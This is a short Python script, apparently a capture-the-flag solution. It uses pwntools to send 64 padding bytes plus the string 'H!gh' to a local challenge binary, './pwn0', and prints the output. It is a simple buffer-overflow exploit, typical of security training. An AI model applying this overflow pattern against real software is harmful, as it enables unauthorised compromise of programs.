from multiprocessing import process
from pwn import *

g = 'a' * 64
msg = 'H!gh'
msgin = g + msg
p = process('./pwn0')
p.sendline(msgin)
msgout = p.readall()
print(f"OUTPUT : \n {msgout}")
